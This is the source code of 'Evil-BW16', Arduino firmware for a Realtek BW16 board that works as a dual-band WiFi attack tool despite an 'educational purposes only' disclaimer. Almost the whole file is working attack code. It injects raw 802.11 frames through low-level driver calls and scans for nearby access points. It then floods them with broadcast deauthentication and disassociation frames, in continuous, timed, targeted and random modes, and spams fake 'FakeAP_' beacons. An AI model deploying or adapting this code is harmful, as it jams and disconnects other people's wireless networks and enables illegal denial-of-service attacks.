/*
   Evil-BW16 - WiFi Dual band deauther

   Copyright (c) 2024 7h30th3r0n3

   Permission is hereby granted, free of charge, to any person obtaining a copy
   of this software and associated documentation files (the "Software"), to deal
   in the Software without restriction, including without limitation the rights
   to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
   copies of the Software, and to permit persons to whom the Software is
   furnished to do so, subject to the following conditions:

   The above copyright notice and this permission notice shall be included in all
   copies or substantial portions of the Software.

   THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
   IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
   FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
   AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
   LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
   OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
   SOFTWARE.

   Disclaimer:
   This tool, Evil-BW16, is developed for educational and ethical testing purposes only.
   Any misuse or illegal use of this tool is strictly prohibited. The creator of Evil-BW16
   assumes no liability and is not responsible for any misuse or damage caused by this tool.
   Users are required to comply with all applicable laws and regulations in their jurisdiction
   regarding network testing and ethical hacking.
*/

#include <Arduino.h>
#include <vector>
#include "wifi_conf.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "WiFi.h"

//==========================
// User Configuration
//==========================
#define WIFI_SSID       "7h30th3r0n35Ghz"
#define WIFI_PASS       "5Ghz7h30th3r0n3Pass"
#define WIFI_CHANNEL    1

bool USE_LED = true; 

// Attack parameters
unsigned long last_cycle     = 0;
unsigned long cycle_delay    = 2000;     // Delay between attack cycles (ms)
unsigned long scan_time      = 5000;     // WiFi scan duration (ms)
unsigned long num_send_frames= 3; 
int start_channel            = 1;        // 1 => 2.4GHz start, 36 => 5GHz only
bool scan_between_cycles     = false;    // If true, scans between each attack cycle

uint8_t dst_mac[6]  = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; // Broadcast

//-------------------
// Timed Attack
//-------------------
bool timedAttackEnabled      = false;
unsigned long attackStartTime = 0;
unsigned long attackDuration  = 10000; // default 10 seconds

//==========================================================
// Frame Structures
//==========================================================
typedef struct {
  // IEEE 802.11 Management Frame Header
  uint16_t frame_control;      // Frame Control: 0x8000 for Beacon
  uint16_t duration;           // Duration: 0x0000
  uint8_t destination[6];     // Destination MAC: Broadcast (FF:FF:FF:FF:FF:FF)
  uint8_t source[6];          // Source MAC: Fake AP MAC
  uint8_t bssid[6];           // BSSID: Same as Source MAC
  uint16_t sequence_number;    // Sequence Control: 0x0000

  // Beacon Frame Body
  uint64_t timestamp;          // Timestamp: 0x0000000000000000
  uint16_t beacon_interval;    // Beacon Interval: 0x0064 (100 TU)
  uint16_t capability_info;    // Capability Information: 0x0021 (ESS, Privacy)

  // Information Elements (IEs)
  uint8_t ssid_tag;            // SSID IE Tag Number: 0x00
  uint8_t ssid_length;         // SSID Length
  uint8_t ssid[32];            // SSID: Up to 32 bytes

  uint8_t supported_rates_tag; // Supported Rates IE Tag Number: 0x01
  uint8_t supported_rates_length; // Supported Rates Length: 0x08
  uint8_t supported_rates[8];  // Supported Rates: Example Rates

  uint8_t ds_parameter_set_tag; // DS Parameter Set IE Tag Number: 0x03
  uint8_t ds_parameter_set_length; // DS Parameter Set Length: 0x01
  uint8_t current_channel;      // Current Channel: 1-14 for 2.4GHz, 36-165 for 5GHz
} BeaconFrame;

typedef struct {
  uint16_t frame_control = 0xC0;  // Deauth
  uint16_t duration = 0xFFFF;
  uint8_t destination[6];
  uint8_t source[6];
  uint8_t access_point[6];
  const uint16_t sequence_number = 0;
  uint16_t reason = 0x06;
} DeauthFrame;

typedef struct {
  uint16_t frame_control = 0xA0;  // Disassociation
  uint16_t duration = 0xFFFF;
  uint8_t destination[6];
  uint8_t source[6];
  uint8_t access_point[6];
  const uint16_t sequence_number = 0;
  uint16_t reason = 0x08;
} DisassocFrame;

//==========================================================
// Data Structures
//==========================================================
struct WiFiScanResult {
  bool selected = false;
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint channel;
};

struct WiFiStationResult {
  bool selected = false;
  String mac_str;
  uint8_t mac[6];
  short rssi;
};

//==========================================================
// Externs & Prototypes (Realtek / Ameba Specific)
//==========================================================
extern uint8_t* rltk_wlan_info;
extern "C" void* alloc_mgtxmitframe(void* ptr);
extern "C" void update_mgntframe_attrib(void* ptr, void* frame_control);
extern "C" int dump_mgntframe(void* ptr, void* frame_control);

// Typically: int wifi_get_mac_address(char *mac);
extern "C" int wifi_get_mac_address(char *mac);

//==========================================================
// Function Prototypes
//==========================================================
void wifi_tx_raw_frame(void* frame, size_t length);
void wifi_tx_deauth_frame(const void* src_mac, const void* dst_mac, uint16_t reason = 0x06);
void wifi_tx_disassoc_frame(const void* src_mac, const void* dst_mac, uint16_t reason = 0x08);
void wifi_tx_beacon_frame(const void* src_mac, const void* dst_mac, const char *ssid);

int scanNetworks();
void printScanResults();
void handleCommand(String command);
void targetAttack();
void generalAttack();
void attackCycle();
void startTimedAttack(unsigned long durationMs);
void checkTimedAttack();

//==========================================================
// Global Vectors
//==========================================================
std::vector<WiFiScanResult> scan_results;
std::vector<WiFiScanResult> target_aps;

//==========================================================
// Beacon Spam Control
//==========================================================
bool beacon_spam_enabled        = false;  // If true, spam continuously
unsigned long beacon_spam_interval = 300;   // Interval in ms
unsigned long last_beacon_spam   = 0;

//==========================================================
// Disassociation Attack Control
//==========================================================
bool disassoc_enabled           = false;  // If true, perform continuous disassoc
unsigned long disassoc_interval = 1000;   // Interval in ms
unsigned long last_disassoc_attack = 0;

//==========================================================
// Raw Frame Injection
//==========================================================
void wifi_tx_raw_frame(void* frame, size_t length) {
  void *ptr = (void *)**(uint32_t **)(rltk_wlan_info + 0x10);
  void *frame_control = alloc_mgtxmitframe(ptr + 0xae0);

  if (frame_control != 0) {
    update_mgntframe_attrib(ptr, frame_control + 8);
    memset((void *)*(uint32_t *)(frame_control + 0x80), 0, 0x68);
    uint8_t *frame_data = (uint8_t *)*(uint32_t *)(frame_control + 0x80) + 0x28;
    memcpy(frame_data, frame, length);
    *(uint32_t *)(frame_control + 0x14) = length;
    *(uint32_t *)(frame_control + 0x18) = length;
    dump_mgntframe(ptr, frame_control);
  }
}

//==========================================================
// Deauth & Disassoc
//==========================================================
void wifi_tx_deauth_frame(const void* src_mac, const void* dst_mac, uint16_t reason) {
  DeauthFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  frame.reason = reason;
  wifi_tx_raw_frame((void*)&frame, sizeof(DeauthFrame));
}

void wifi_tx_disassoc_frame(const void* src_mac, const void* dst_mac, uint16_t reason) {
  DisassocFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  frame.reason = reason;
  wifi_tx_raw_frame((void*)&frame, sizeof(DisassocFrame));
}

//==========================================================
// Beacon Frame (Fake AP)
//==========================================================
void wifi_tx_beacon_frame(const void* src_mac, const void* dst_mac, const char *ssid) {
  BeaconFrame frame;

  // Initialize Frame Control: Management frame (00), Beacon subtype (1000)
  frame.frame_control = 0x8000; // 0x80 for Beacon, 0x00 for Type Management

  // Duration
  frame.duration = 0x0000;

  // Destination MAC: Broadcast
  memcpy(&frame.destination, dst_mac, 6);

  // Source MAC and BSSID: Fake AP MAC
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.bssid, src_mac, 6);

  // Sequence Control
  frame.sequence_number = 0x0000;

  // Timestamp
  frame.timestamp = 0x0000000000000000;

  // Beacon Interval
  frame.beacon_interval = 0x0064; // 100 TU

  // Capability Information
  frame.capability_info = 0x0021; // ESS, Privacy

  // SSID IE
  frame.ssid_tag = 0x00; // SSID IE
  size_t ssid_len = strlen(ssid);
  if(ssid_len > 32) ssid_len = 32; // Limit SSID to 32 bytes
  frame.ssid_length = ssid_len;
  memset(frame.ssid, 0, 32);
  memcpy(frame.ssid, ssid, ssid_len);

  // Supported Rates IE
  frame.supported_rates_tag = 0x01; // Supported Rates IE
  frame.supported_rates_length = 0x08; // Length of Supported Rates
  uint8_t rates[] = {0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24}; // Example Rates: 1, 2, 5.5, 11, 6, 9, 12, 18 Mbps
  memcpy(frame.supported_rates, rates, 8);

  // DS Parameter Set IE
  frame.ds_parameter_set_tag = 0x03; // DS Parameter Set IE
  frame.ds_parameter_set_length = 0x01; // DS Parameter Set Length
  frame.current_channel = start_channel; // Current Channel

  // Calculate total frame size
  size_t frame_size = sizeof(BeaconFrame);

  // Send the raw frame
  wifi_tx_raw_frame((void*)&frame, frame_size);
}

//==========================================================
// Sorting Helper
//==========================================================
void sortByChannel(std::vector<WiFiScanResult> &results) {
  for (size_t i = 0; i < results.size(); i++) {
    size_t min_idx = i;
    for (size_t j = i + 1; j < results.size(); j++) {
      if (results[j].channel < results[min_idx].channel) {
        min_idx = j;
      }
    }
    if (min_idx != i) {
      WiFiScanResult temp = results[i];
      results[i] = results[min_idx];
      results[min_idx] = temp;
    }
  }
}

//==========================================================
// Wi-Fi Scan Callback
//==========================================================
rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  if (scan_result->scan_complete == 0) {
    rtw_scan_result_t *record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;

    // Keep only APs >= start_channel if you want to filter 5GHz
    if (record->channel >= start_channel) {
      WiFiScanResult result;
      result.ssid = String((const char*) record->SSID.val);
      result.channel = record->channel;
      result.rssi = record->signal_strength;
      memcpy(&result.bssid, &record->BSSID, 6);

      char bssid_str[20];
      snprintf(bssid_str, sizeof(bssid_str), 
               "%02X:%02X:%02X:%02X:%02X:%02X",
               result.bssid[0], result.bssid[1], result.bssid[2],
               result.bssid[3], result.bssid[4], result.bssid[5]);
      result.bssid_str = bssid_str;
      scan_results.push_back(result);
    }
  } else {
    // Scan completed
  }
  return RTW_SUCCESS;
}

//==========================================================
// Start a WiFi Scan
//==========================================================
int scanNetworks() {
  Serial.println("Starting WiFi scan...");
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    if (USE_LED) digitalWrite(LED_G, HIGH);
    delay(scan_time); 
    Serial.println("Scan completed!");

    // Sort results by channel
    sortByChannel(scan_results);
    if (USE_LED) digitalWrite(LED_G, LOW);
    return 0;
  } else {
    Serial.println("Failed to start the scan!");
    return 1;
  }
}

//==========================================================
// Print Scan Results
//==========================================================
void printScanResults() {
  Serial.println("Detected networks:");
  for (size_t i = 0; i < scan_results.size(); i++) {
    String freq = (scan_results[i].channel >= 36) ? "5GHz" : "2.4GHz";
    Serial.print(i);
    Serial.print("\tSSID: ");
    Serial.print(scan_results[i].ssid);
    Serial.print("\tBSSID: ");
    Serial.print(scan_results[i].bssid_str);
    Serial.print("\tChannel: ");
    Serial.print(scan_results[i].channel);
    Serial.print("\tRSSI: ");
    Serial.print(scan_results[i].rssi);
    Serial.print(" dBm\t");
    Serial.println(freq);
  }
}

//==========================================================
// Attack State Variables
//==========================================================
bool attack_enabled = false;
bool scan_enabled   = false;
bool target_mode    = false;

//==========================================================
// Timed Attack
//==========================================================
void startTimedAttack(unsigned long durationMs) {
  timedAttackEnabled = true;
  attackStartTime    = millis();
  attackDuration     = durationMs;
  attack_enabled     = true;
}

void checkTimedAttack() {
  if(timedAttackEnabled && (millis() - attackStartTime > attackDuration)) {
    attack_enabled     = false;
    timedAttackEnabled = false;
    Serial.println("[INFO] Timed attack ended.");
  }
}

//==========================================================
// Handle Incoming Commands
//==========================================================
void handleCommand(String command) {
  command.trim();

  // Deauth Attack Commands
  if(command.equalsIgnoreCase("start")) {
    attack_enabled = true;
    Serial.println("[INFO] Deauthentication Attack started.");
  }
  else if(command.equalsIgnoreCase("stop")) {
    // Unified stop command: Stops all active attacks
    attack_enabled = false;
    disassoc_enabled = false;
    beacon_spam_enabled = false;
    Serial.println("[INFO] All attacks stopped.");
  }
  else if(command.equalsIgnoreCase("scan")) {
    scan_enabled = true;
    Serial.println("[INFO] Starting scan...");
    if(scanNetworks() == 0) {
      printScanResults();
      scan_enabled = false;
      Serial.println("[INFO] Scan completed.");
    }
    else {
      Serial.println("[ERROR] Scan failed.");
    }
  }
  else if(command.equalsIgnoreCase("results")) {
    if(!scan_results.empty()) {
      printScanResults();
    }
    else {
      Serial.println("[INFO] No scan results available. Try 'scan' first.");
    }
  }

  //==========================
  // Timed Attack
  //==========================
  else if(command.startsWith("attack_time ")) {
    String valStr = command.substring(String("attack_time ").length());
    unsigned long durationMs = valStr.toInt();
    if(durationMs > 0) {
      startTimedAttack(durationMs);
      Serial.println("[INFO] Timed attack started for " + String(durationMs) + " ms.");
    }
    else {
      Serial.println("[ERROR] Invalid attack duration.");
    }
  }

  //==========================
  // Disassociation Attack Commands (Start Only)
  //==========================
  else if(command.equalsIgnoreCase("disassoc")) {
    if(!disassoc_enabled) {
      disassoc_enabled = true;
      Serial.println("[INFO] Continuous Disassociation Attack started.");
    }
    else {
      Serial.println("[INFO] Disassociation Attack is already running.");
    }
  }

  //==========================
  // Beacon Spam Commands (Start Only)
  //==========================
  else if(command.equalsIgnoreCase("beacon_spam")) {
    if(!beacon_spam_enabled) {
      beacon_spam_enabled = true;
      Serial.println("[INFO] Continuous Beacon Spam started.");
    }
    else {
      Serial.println("[INFO] Beacon Spam is already running.");
    }
  }

  else if(command.startsWith("beacon_spam interval ")) {
    // e.g., "beacon_spam interval 500"
    String valStr = command.substring(String("beacon_spam interval ").length());
    unsigned long intervalMs = valStr.toInt();
    if(intervalMs > 0) {
      beacon_spam_interval = intervalMs;
      Serial.println("[INFO] Beacon spam interval set to " + String(intervalMs) + " ms.");
    }
    else {
      Serial.println("[ERROR] Invalid interval value.");
    }
  }

  //==========================
  // Random Channel Attack
  //==========================
  else if(command.equalsIgnoreCase("random_attack")) {
    if(!scan_results.empty()) {
      size_t idx = random(0, scan_results.size());
      uint8_t randChannel = scan_results[idx].channel;
      wifi_set_channel(randChannel);
      for(int j = 0; j < num_send_frames; j++) {
        wifi_tx_deauth_frame(scan_results[idx].bssid, dst_mac, 2);
        Serial.print("[RANDOM ATTACK] Deauth ");
        Serial.print(j + 1);
        Serial.print(" => ");
        Serial.print(scan_results[idx].ssid);
        Serial.print(" on channel ");
        Serial.println(randChannel);
      }
    }
    else {
      Serial.println("[ERROR] No AP results available. Run 'scan' first.");
    }
  }

  //==========================
  // "set" Command (Existing)
  //==========================
  else if(command.startsWith("set ")) {
    String setting = command.substring(4);
    setting.trim();
    int space_index = setting.indexOf(' ');
    if(space_index != -1) {
      String key = setting.substring(0, space_index);
      String value = setting.substring(space_index + 1);
      value.replace(" ", "");

      if(key.equalsIgnoreCase("cycle_delay")) {
        cycle_delay = value.toInt();
        Serial.println("[INFO] Updated cycle_delay to " + String(cycle_delay) + " ms.");
      }
      else if(key.equalsIgnoreCase("scan_time")) {
        scan_time = value.toInt();
        Serial.println("[INFO] Updated scan_time to " + String(scan_time) + " ms.");
      }
      else if(key.equalsIgnoreCase("num_frames")) {
        num_send_frames = value.toInt();
        Serial.println("[INFO] Updated num_send_frames to " + String(num_send_frames) + ".");
      }
      else if(key.equalsIgnoreCase("start_channel")) {
        start_channel = value.toInt();
        Serial.println("[INFO] Updated start_channel to " + String(start_channel) + ".");
      }
      else if(key.equalsIgnoreCase("scan_cycles")) {
        if(value.equalsIgnoreCase("on")) {
          scan_between_cycles = true;
          Serial.println("[INFO] Scan between attack cycles activated.");
        }
        else if(value.equalsIgnoreCase("off")) {
          scan_between_cycles = false;
          Serial.println("[INFO] Scan between attack cycles deactivated.");
        }
        else {
          Serial.println("[ERROR] Invalid value for scan_cycles. Use 'on' or 'off'.");
        }
      }
      else if(key.equalsIgnoreCase("led")) {
        if(value.equalsIgnoreCase("on")) {
          USE_LED = true;
          Serial.println("[INFO] LEDs activated.");
        }
        else if(value.equalsIgnoreCase("off")) {
          USE_LED = false;
          Serial.println("[INFO] LEDs deactivated.");
        }
        else {
          Serial.println("[ERROR] Invalid value for LED. Use 'set led on' or 'set led off'.");
        }
      }
      else if(key.equalsIgnoreCase("target")) {
        // e.g., set target 1,2,3
        target_aps.clear();
        target_mode = false;

        int start = 0;
        int end   = 0;
        while((end = value.indexOf(',', start)) != -1) {
          String index_str = value.substring(start, end);
          int target_index = index_str.toInt();
          if(target_index >= 0 && target_index < (int)scan_results.size()) {
            target_aps.push_back(scan_results[target_index]);
          }
          else {
            Serial.println("[ERROR] Invalid target index: " + index_str);
          }
          start = end + 1;
        }

        // Last index
        if(start < value.length()) {
          String index_str = value.substring(start);
          int target_index = index_str.toInt();
          if(target_index >= 0 && target_index < (int)scan_results.size()) {
            target_aps.push_back(scan_results[target_index]);
          }
          else {
            Serial.println("[ERROR] Invalid target index: " + index_str);
          }
        }

        if(!target_aps.empty()) {
          target_mode = true;
          Serial.println("[INFO] Targeting the following APs:");
          for(size_t i = 0; i < target_aps.size(); i++) {
            Serial.print("- SSID: ");
            Serial.print(target_aps[i].ssid);
            Serial.print(" BSSID: ");
            Serial.println(target_aps[i].bssid_str);
          }
        }
        else {
          target_mode = false;
          Serial.println("[ERROR] No valid targets selected.");
        }
      }
      else {
        Serial.println("[ERROR] Unknown setting: " + key);
      }
    }
    else {
      Serial.println("[ERROR] Invalid format. Use: set <key> <value>");
    }
  }
  else if(command.equalsIgnoreCase("info")) {
    Serial.println("[INFO] Current Configuration:");
    Serial.println("Cycle Delay: " + String(cycle_delay) + " ms");
    Serial.println("Scan Time: " + String(scan_time) + " ms");
    Serial.println("Number of Frames per AP: " + String(num_send_frames));
    Serial.println("Start Channel: " + String(start_channel));
    Serial.println("Scan between attack cycles: " + String(scan_between_cycles ? "Enabled" : "Disabled"));
    Serial.println("LEDs: " + String(USE_LED ? "On" : "Off"));

    if(target_mode && !target_aps.empty()) {
      Serial.println("[INFO] Targeted APs:");
      for(size_t i = 0; i < target_aps.size(); i++) {
        Serial.print("- SSID: ");
        Serial.print(target_aps[i].ssid);
        Serial.print(" BSSID: ");
        Serial.println(target_aps[i].bssid_str);
      }
    }
    else {
      Serial.println("[INFO] No APs targeted.");
    }
  }
  else if(command.equalsIgnoreCase("help")) {
    Serial.println("[HELP] Available commands:");
    Serial.println("- start: Begin the deauth attack cycle.");
    Serial.println("- stop: Stop all attack cycles.");
    Serial.println("- scan: Perform a WiFi scan and display results.");
    Serial.println("- results: Show last scan results.");
    Serial.println("- disassoc: Begin continuous disassociation attacks.");
    Serial.println("- beacon_spam: Begin continuous beacon spam.");
    Serial.println("- beacon_spam interval <ms>: Set interval for beacon spam (default: 300 ms).");
    Serial.println("- random_attack: Deauth a randomly chosen AP from the scan list.");
    Serial.println("- attack_time <ms>: Start a timed attack for the specified duration.");
    Serial.println("- set <key> <value>: Update configuration settings.");
    Serial.println("  * target <indices>, e.g., 'set target 1,3,5'.");
    Serial.println("  * cycle_delay (ms), scan_time (ms), num_frames, start_channel (1 or 36).");
    Serial.println("  * scan_cycles on/off, led on/off.");
    Serial.println("- info: Display the current configuration.");
    Serial.println("- help: Display this help message.");
  }
  else {
    Serial.println("[ERROR] Unknown command. Type 'help' for a list of commands.");
  }
}

//==========================================================
// Attack Functions
//==========================================================
void targetAttack() {
  if(target_mode && attack_enabled) {
    for(size_t i = 0; i < target_aps.size(); i++) {
      wifi_set_channel(target_aps[i].channel);
      for(int j = 0; j < num_send_frames; j++) {
        wifi_tx_deauth_frame(target_aps[i].bssid, dst_mac, 2);
        if(USE_LED) {
          digitalWrite(LED_B, HIGH);
          delay(50);
          digitalWrite(LED_B, LOW);
        }
        Serial.print("Deauth frame ");
        Serial.print(j + 1);
        Serial.print(" => ");
        Serial.print(target_aps[i].ssid);
        Serial.print(" (");
        Serial.print(target_aps[i].bssid_str);
        Serial.print(") on channel ");
        Serial.println(target_aps[i].channel);
      }
    }
  }
}

void generalAttack() {
  if(!target_mode && attack_enabled) {
    attackCycle(); 
  }
}

void attackCycle() {
  Serial.println("Starting attack cycle...");

  uint8_t currentChannel = 0xFF;
  for(size_t i = 0; i < scan_results.size(); i++) {
    uint8_t targetChannel = scan_results[i].channel;
    if(targetChannel != currentChannel) {
      wifi_set_channel(targetChannel);
      currentChannel = targetChannel;
    }

    for(int j = 0; j < num_send_frames; j++) {
      wifi_tx_deauth_frame(scan_results[i].bssid, dst_mac, 2);
      if(USE_LED) {
        digitalWrite(LED_B, HIGH);
        delay(50);
        digitalWrite(LED_B, LOW);
      }
      Serial.print("Deauth frame ");
      Serial.print(j + 1);
      Serial.print(" => ");
      Serial.print(scan_results[i].ssid);
      Serial.print(" (");
      Serial.print(scan_results[i].bssid_str);
      Serial.print(") on channel ");
      Serial.println(scan_results[i].channel);
    }
  }
  Serial.println("Attack cycle completed.");
}

//==========================================================
// Setup
//==========================================================
void setup() {
  Serial.begin(115200);

  if(USE_LED) {
    pinMode(LED_R, OUTPUT);
    pinMode(LED_G, OUTPUT);
    pinMode(LED_B, OUTPUT);

    // Simple LED test sequence
    digitalWrite(LED_R, HIGH); delay(200); digitalWrite(LED_R, LOW);
    digitalWrite(LED_G, HIGH); delay(200); digitalWrite(LED_G, LOW);
    digitalWrite(LED_B, HIGH); delay(200); digitalWrite(LED_B, LOW);
    digitalWrite(LED_R, HIGH); digitalWrite(LED_G, HIGH);
    delay(200);
    digitalWrite(LED_R, LOW); digitalWrite(LED_G, LOW);
    digitalWrite(LED_G, HIGH); digitalWrite(LED_B, HIGH);
    delay(200);
    digitalWrite(LED_G, LOW); digitalWrite(LED_B, LOW);
    digitalWrite(LED_R, HIGH); digitalWrite(LED_B, HIGH);
    delay(200);
    digitalWrite(LED_R, LOW); digitalWrite(LED_B, LOW);
    digitalWrite(LED_R, HIGH); digitalWrite(LED_G, HIGH); digitalWrite(LED_B, HIGH);
    delay(200);
    digitalWrite(LED_R, LOW); digitalWrite(LED_G, LOW); digitalWrite(LED_B, LOW);
  }

  Serial.println("Initializing WiFi in hidden AP mode...");
  wifi_on(RTW_MODE_AP);
  wifi_start_ap_with_hidden_ssid(WIFI_SSID,
                                 RTW_SECURITY_WPA2_AES_PSK,
                                 WIFI_PASS,
                                 11,   // keyID
                                 18,   // SSID length
                                 WIFI_CHANNEL);
  Serial.println("Hidden AP started. Selected channel: " + String(WIFI_CHANNEL));

  last_cycle = millis();
}

//==========================================================
// Main Loop
//==========================================================
void loop() {
  // Handle commands from Serial
  if(Serial.available()) {
    String command = Serial.readStringUntil('\n');
    handleCommand(command);
  }

  // Timed Attack check
  checkTimedAttack();

  // Attack cycles
  if(millis() - last_cycle > cycle_delay) {
    if(attack_enabled) {
      // Optionally perform a scan between cycles
      if(scan_between_cycles) {
        Serial.println("[INFO] Starting scan between attack cycles...");
        if(scanNetworks() == 0) {
          printScanResults();
        }
        else {
          Serial.println("[ERROR] Scan failed.");
        }
      }
      if(target_mode) {
        targetAttack();
      }
      else {
        generalAttack();
      }
    }
    last_cycle = millis();
  }

  //===============================
  // CONTINUOUS BEACON SPAM
  //===============================
  if(beacon_spam_enabled && (millis() - last_beacon_spam >= beacon_spam_interval)) {
    last_beacon_spam = millis();

    // Retrieve device MAC
    rtw_mac_t my_mac;
    if(wifi_get_mac_address(reinterpret_cast<char*>(my_mac.octet)) == RTW_SUCCESS) {
      // Rotate channels for broader coverage
      static uint8_t current_spam_channel = start_channel;
      wifi_set_channel(current_spam_channel);

      // Generate a unique SSID by appending a counter
      static unsigned long spam_counter = 0;
      const char* base_ssid = "FakeAP_";
      char ssid_buffer[32];
      snprintf(ssid_buffer, sizeof(ssid_buffer), "%s%lu", base_ssid, spam_counter++);

      // Send beacon frame
      wifi_tx_beacon_frame(my_mac.octet, dst_mac, ssid_buffer);

      // Rotate channel for next spam
      current_spam_channel++;
      if(current_spam_channel > 14) { // Assuming 2.4GHz
        current_spam_channel = 1;
      }

      // Optional LED feedback
      if(USE_LED) {
        digitalWrite(LED_G, HIGH);
        delay(50);
        digitalWrite(LED_G, LOW);
      }

      // Print once each spam cycle
      Serial.println("[BEACON SPAM] Sent beacon: " + String(ssid_buffer) + " on channel " + String(current_spam_channel));
    }
    else {
      Serial.println("[ERROR] Could not retrieve device MAC for beacon spam.");
    }
  }

  //===============================
  // CONTINUOUS DISASSOC ATTACK
  //===============================
  if(disassoc_enabled && (millis() - last_disassoc_attack >= disassoc_interval)) {
    last_disassoc_attack = millis();

    // Decide which list of APs to attack
    const std::vector<WiFiScanResult> &aps_to_attack =
        (target_mode && !target_aps.empty()) ? target_aps : scan_results;

    if(aps_to_attack.empty()) {
      Serial.println("[ERROR] No APs available for Disassociation Attack. Perform a scan or set targets first.");
      return;
    }

    for(size_t i = 0; i < aps_to_attack.size(); i++) {
      wifi_set_channel(aps_to_attack[i].channel);

      for(int j = 0; j < num_send_frames; j++) {
        // Reason code 8 => Disassociated because station left
        wifi_tx_disassoc_frame(aps_to_attack[i].bssid, dst_mac, 0x08); 

        // Optional LED blink
        if(USE_LED) {
          digitalWrite(LED_B, HIGH);
          delay(50);
          digitalWrite(LED_B, LOW);
        }

        Serial.print("[DISASSOC] Frame ");
        Serial.print(j + 1);
        Serial.print(" => ");
        Serial.print(aps_to_attack[i].ssid);
        Serial.print(" (");
        Serial.print(aps_to_attack[i].bssid_str);
        Serial.print(") on channel ");
        Serial.println(aps_to_attack[i].channel);
      }
    }

    Serial.println("[DISASSOC] Disassociation Attack cycle completed.");
  }
}
